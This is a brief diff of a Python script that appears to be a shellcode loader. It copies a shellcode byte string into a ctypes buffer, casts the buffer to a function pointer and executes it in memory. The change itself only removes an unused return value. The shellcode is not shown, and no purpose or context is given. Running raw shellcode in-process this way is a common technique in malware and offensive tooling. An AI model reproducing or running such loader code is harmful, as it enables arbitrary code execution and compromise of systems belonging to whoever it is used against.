@@ -13,7 +13,6 @@ shellcode = str(shellcode).encode()
 def execute(**kwargs):
     buffer = ctypes.c_buffer(shellcode)
     executeShellcode = ctypes.cast(buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
-    a = executeShellcode()
-    return a
+    executeShellcode()
 
 execute()
